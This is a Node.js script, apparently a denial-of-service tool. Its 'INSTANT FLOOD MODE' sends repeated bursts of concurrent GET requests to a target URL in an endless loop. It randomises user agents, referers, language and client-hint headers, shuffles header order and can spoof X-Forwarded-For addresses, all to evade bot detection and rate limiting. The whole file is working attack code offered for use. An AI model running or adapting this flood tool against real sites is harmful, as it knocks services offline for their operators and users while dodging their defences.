const https = require('https');
const http = require('http');
const { URL } = require('url');

// CONFIG
const CONFIG = {
    targetUrl: 'https://example.com/',
    totalRequests: 10,
    timeout: 10000,
    maxRedirects: 3,
    color: true,
    stats: true,
    loopDelay: 0,
    stealth: {
        shuffleHeaders: true,
        secChUa: true,
        acceptLang: true,
        referer: true,
        dnt: true,
        xForwardedFor: false,
    }
};

// COLOR

const C = { r: '\x1b[0m', R: '\x1b[31m', G: '\x1b[32m', Y: '\x1b[33m', B: '\x1b[34m', C: '\x1b[36m', D: '\x1b[90m', W: '\x1b[1m' };
const c = (s, x) => CONFIG.color ? `${C[x]}${s}${C.r}` : s;

// UA GEN

const UA = {
    win: ['10.0; Win64; x64', '10.0; WOW64', '11.0; Win64; x64'],
    mac: ['10_15_7', '14_5', '14_6', '14_7', '15_0', '15_1', '15_2'],
    linux: ['X11; Linux x86_64', 'X11; Ubuntu; Linux x86_64'],
    android: ['12', '13', '14', '15'],
    ios: ['16_7', '17_5', '17_6', '18_0', '18_1', '18_2', '18_3'],
    chrome: ['120','121','122','123','124','125','126','127','128','129','130','131','132','133'],
    firefox: ['120','121','122','123','124','125','126','127','128','129','130','131','132','133','134','135'],
    safari: ['17.5', '17.6', '18.0', '18.1', '18.2', '18.3'],
    edge: ['120','121','122','123','124','125','126','127','128','129','130','131','132','133'],
    devices: [
        'SM-S921B','SM-S928B','SM-G998B','SM-A536B','SM-A346B',
        'Pixel 8 Pro','Pixel 9','Pixel 7','Pixel 8',
        '23127PN0CC','22101316G','CPH2521','V2205','RMX3840'
    ],
    lang: ['en-US,en;q=0.9','en-US,en;q=0.9,id;q=0.8','id-ID,id;q=0.9,en;q=0.8','en-GB,en;q=0.9','zh-CN,zh;q=0.9,en;q=0.8','ko-KR,ko;q=0.9,en;q=0.8','de-DE,de;q=0.9,en;q=0.8','fr-FR,fr;q=0.9,en;q=0.8','pt-BR,pt;q=0.9,en;q=0.8','es-ES,es;q=0.9,en;q=0.8','ja-JP,ja;q=0.9,en;q=0.8'],
    referer: ['https://www.google.com/','https://www.google.com/search?q=test','https://www.facebook.com/','https://www.instagram.com/','https://www.tiktok.com/','https://twitter.com/','https://www.youtube.com/','https://t.me/','https://wa.me/','https://www.linkedin.com/'],

    r(a) { return a[Math.floor(Math.random() * a.length)]; },
    ri(a, b) { return Math.floor(Math.random() * (b - a + 1)) + a; },

    gen() {
        const t = this.ri(0, 9);
        const b = this.ri(5000, 7000);
        const p = this.ri(0, 200);
        switch(t) {
            case 0: return `Mozilla/5.0 (Windows NT ${this.r(this.win)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${this.r(this.chrome)}.0.${b}.${p} Safari/537.36`;
            case 1: return `Mozilla/5.0 (Windows NT ${this.r(this.win)}; rv:${this.r(this.firefox)}.0) Gecko/20100101 Firefox/${this.r(this.firefox)}.0`;
            case 2: return `Mozilla/5.0 (Windows NT ${this.r(this.win)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${this.r(this.chrome)}.0.${b}.${p} Safari/537.36 Edg/${this.r(this.edge)}.0.${this.ri(1000,2000)}.${p}`;
            case 3: return `Mozilla/5.0 (Macintosh; Intel Mac OS X ${this.r(this.mac)}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${this.r(this.safari)} Safari/605.1.15`;
            case 4: return `Mozilla/5.0 (Macintosh; Intel Mac OS X ${this.r(this.mac)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${this.r(this.chrome)}.0.${b}.${p} Safari/537.36`;
            case 5: return `Mozilla/5.0 (${this.r(this.linux)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${this.r(this.chrome)}.0.${b}.${p} Safari/537.36`;
            case 6: return `Mozilla/5.0 (${this.r(this.linux)}; rv:${this.r(this.firefox)}.0) Gecko/20100101 Firefox/${this.r(this.firefox)}.0`;
            case 7: return `Mozilla/5.0 (Linux; Android ${this.r(this.android)}; ${this.r(this.devices)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${this.r(this.chrome)}.0.${b}.${p} Mobile Safari/537.36`;
            case 8: return `Mozilla/5.0 (iPhone; CPU iPhone OS ${this.r(this.ios)} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${this.r(this.safari)} Mobile/15E148 Safari/604.1`;
            case 9: return `Mozilla/5.0 (iPhone; CPU iPhone OS ${this.r(this.ios)} like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) CriOS/${this.r(this.chrome)}.0.${b}.${p} Mobile/15E148 Safari/537.36`;
        }
    }
};

// HEADERS

function buildHeaders(ua) {
    const h = {
        'User-Agent': ua,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
    };
    if (CONFIG.stealth.acceptLang) h['Accept-Language'] = UA.r(UA.lang);
    if (CONFIG.stealth.referer && Math.random() > 0.3) { h['Referer'] = UA.r(UA.referer); h['Sec-Fetch-Site'] = 'cross-site'; }
    if (CONFIG.stealth.dnt) h['DNT'] = Math.random() > 0.5 ? '1' : '0';
    if (CONFIG.stealth.xForwardedFor) h['X-Forwarded-For'] = `${UA.ri(1,223)}.${UA.ri(0,255)}.${UA.ri(0,255)}.${UA.ri(1,254)}`;

    if (CONFIG.stealth.secChUa && ua.includes('Chrome') && !ua.includes('Safari')) {
        let v = '133', plat = '"Unspecified"';
        if (ua.includes('Edg/')) { const m = ua.match(/Edg\/(\d+)/); if(m) v=m[1]; }
        else { const m = ua.match(/Chrome\/(\d+)/); if(m) v=m[1]; }
        if (ua.includes('Windows')) plat = '"Windows"';
        else if (ua.includes('Macintosh')) plat = '"macOS"';
        else if (ua.includes('Android')) plat = '"Android"';
        else if (ua.includes('iPhone')) plat = '"iOS"';
        else if (ua.includes('Linux')) plat = '"Linux"';
        h['sec-ch-ua'] = `"Chromium";v="${v}", "Not_A Brand";v="24", "Google Chrome";v="${v}"`;
        h['sec-ch-ua-mobile'] = ua.includes('Mobile') ? '?1' : '?0';
        h['sec-ch-ua-platform'] = plat;
    }

    if (CONFIG.stealth.shuffleHeaders) {
        const e = Object.entries(h);
        for (let i = e.length - 1; i > 0; i--) { const j = Math.floor(Math.random() * (i + 1)); [e[i], e[j]] = [e[j], e[i]]; }
        return Object.fromEntries(e);
    }
    return h;
}


const agents = new Map();
function getAgent(u) {
    const k = `${u.protocol}//${u.hostname}:${u.port || (u.protocol === 'https:' ? 443 : 80)}`;
    if (!agents.has(k)) {
        const A = u.protocol === 'https:' ? https.Agent : http.Agent;
        agents.set(k, new A({ keepAlive: true, maxSockets: CONFIG.totalRequests, timeout: CONFIG.timeout }));
    }
    return agents.get(k);
}

function doReq(u, headers, redir = 0) {
    return new Promise((res, rej) => {
        if (redir > CONFIG.maxRedirects) return rej(new Error('REDIRECT'));
        const isH = u.protocol === 'https:';
        const mod = isH ? https : http;
        const req = mod.request({
            hostname: u.hostname, port: u.port || (isH ? 443 : 80),
            path: u.pathname + u.search, method: 'GET', headers, timeout: CONFIG.timeout, agent: getAgent(u),
        }, (r) => {
            if ([301,302,303,307,308].includes(r.statusCode) && r.headers.location) {
                r.resume();
                try { doReq(new URL(r.headers.location, u.origin), headers, redir + 1).then(res).catch(rej); } catch(e) { rej(new Error('BAD_REDIRECT')); }
                return;
            }
            r.on('data', () => {});
            r.on('end', () => res(r.statusCode));
        });
        req.on('error', rej);
        req.on('timeout', () => { req.destroy(); rej(new Error('TIMEOUT')); });
        req.end();
    });
}

// INFINITY LOOP

(async () => {
    let url;
    try { url = new URL(CONFIG.targetUrl); } catch(e) { console.error(c(' Invalid URL', 'R')); process.exit(1); }

    const totalStats = { total: 0, ok: 0, fail: 0, to: 0, times: [], codes: {}, errs: {}, rounds: 0 };
    const globalT0 = Date.now();

    let running = true;
    const cleanup = () => {
        if (!running) return;
        running = false;
        console.log(c('\n\n Stopping...', 'Y'));
        const elapsed = ((Date.now() - globalT0) / 1000).toFixed(2);
        if (CONFIG.stats && totalStats.total > 0) {
            const avg = totalStats.times.length ? (totalStats.times.reduce((a,b)=>a+b,0) / totalStats.times.length / 1000).toFixed(3) : '0';
            const rps = elapsed > 0 ? (totalStats.total / elapsed).toFixed(2) : '0';
            const rate = ((totalStats.ok / totalStats.total) * 100).toFixed(1);
            console.log(c('          FINAL SUMMARY', 'W'));
            console.log(`   ${c('Total Time', 'Y')} : ${c(elapsed + 's', 'W')}`);
            console.log(`   ${c('Rounds', 'Y')}     : ${c(totalStats.rounds.toString(), 'W')}`);
            console.log(`   ${c('Total Req', 'Y')}  : ${c(totalStats.total.toString(), 'W')}`);
            console.log(`   ${c('RPS', 'Y')}       : ${c(rps, 'W')}`);
            console.log(`   ${c('OK', 'G')}        : ${c(totalStats.ok.toString(), 'G')} / ${totalStats.total} (${c(rate + '%', 'G')})`);
            console.log(`   ${c('Fail', 'R')}      : ${c(totalStats.fail.toString(), 'R')}`);
            if (totalStats.to) console.log(`   ${c('Timeout', 'Y')}   : ${c(totalStats.to.toString(), 'Y')}`);
            console.log(`   ${c('Avg', 'Y')}       : ${c(avg + 's', 'W')}`);
            if (Object.keys(totalStats.codes).length) {
                console.log(`   ${c('Codes', 'Y')}     :`, Object.entries(totalStats.codes).sort((a,b)=>b[1]-a[1]).map(([k,v])=>`${k}(${v})`).join(' '));
            }
            if (Object.keys(totalStats.errs).length) {
                console.log(`   ${c('Errors', 'Y')}    :`, Object.entries(totalStats.errs).map(([k,v])=>`${k}(${v})`).join(' '));
            }
        }
        for (const [, a] of agents) a.destroy();
        process.exit(0);
    };
    process.on('SIGINT', cleanup);
    process.on('SIGTERM', cleanup);

    console.log(c('\n INSTANT FLOOD MODE — LOOP INFINITE', 'W'));
    console.log(`   Target : ${c(CONFIG.targetUrl, 'W')}`);
    console.log(`   Req/Rnd: ${c(CONFIG.totalRequests.toString(), 'W')} ${c('← ALL IN 1 TICK', 'R')}`);
    console.log(`   Delay  : ${c(CONFIG.loopDelay + 'ms', 'W')}`);
    console.log(c('   Press Ctrl+C to stop\n', 'D'));

    while (running) {
        totalStats.rounds++;
        const roundT0 = Date.now();

        let roundOk = 0, roundFail = 0;

        const promises = Array.from({ length: CONFIG.totalRequests }, (_, i) => {
            const start = Date.now();
            const ua = UA.gen();
            const headers = buildHeaders(ua);

            return doReq(url, headers)
                .then(code => {
                    if (!running) return;
                    const dur = Date.now() - start;
                    totalStats.total++; totalStats.ok++; roundOk++;
                    totalStats.times.push(dur);
                    totalStats.codes[code] = (totalStats.codes[code] || 0) + 1;
                    const icon = code < 400 ? '✅' : '⚠️';
                    const roundTag = `[${c('R' + totalStats.rounds, 'B')}`;
                    console.log(`${roundTag}|${c(String(i+1).padStart(3,'0'), 'D')}] ${icon} ${code} ${c((dur/1000).toFixed(2)+'s', 'G')}`);
                })
                .catch(err => {
                    if (!running) return;
                    const dur = Date.now() - start;
                    const type = err.message === 'TIMEOUT' ? 'TIMEOUT' : err.message === 'REDIRECT' ? 'REDIRECT' : 'ERROR';
                    totalStats.total++; totalStats.fail++; roundFail++;
                    if (type === 'TIMEOUT') totalStats.to++;
                    totalStats.times.push(dur);
                    totalStats.errs[type] = (totalStats.errs[type] || 0) + 1;
                    const icon = type === 'TIMEOUT' ? '🐢' : '❌';
                    const roundTag = `[${c('R' + totalStats.rounds, 'B')}`;
                    console.log(`${roundTag}|${c(String(i+1).padStart(3,'0'), 'D')}] ${icon} ${c(type, 'R')}`);
                });
        });

        await Promise.all(promises);

        const roundDur = ((Date.now() - roundT0) / 1000).toFixed(2);
        const cumElapsed = ((Date.now() - globalT0) / 1000).toFixed(2);
        const cumRps = cumElapsed > 0 ? (totalStats.total / parseFloat(cumElapsed)).toFixed(1) : '0';
        const cumRate = totalStats.total > 0 ? ((totalStats.ok / totalStats.total) * 100).toFixed(0) : '0';
        console.log(
            c('  ─── ', 'D') +
            c(`Round ${totalStats.rounds}`, 'W') +
            c(' done in ', 'D') + c(roundDur + 's', 'Y') +
            c(' │ ', 'D') +
            c(`${roundOk}✅`, 'G') + c(' ', 'D') +
            c(`${roundFail}❌`, 'R') +
            c(' │ ', 'D') +
            c(`Total: ${totalStats.total}`, 'W') +
            c(' │ ', 'D') +
            c(`${cumRps} req/s`, 'C') +
            c(' │ ', 'D') +
            c(`↑${cumRate}%`, 'G') +
            c(' ───\n', 'D')
        );

        if (CONFIG.loopDelay > 0 && running) {
            await new Promise(r => setTimeout(r, CONFIG.loopDelay));
        }
    }

    cleanup();
})();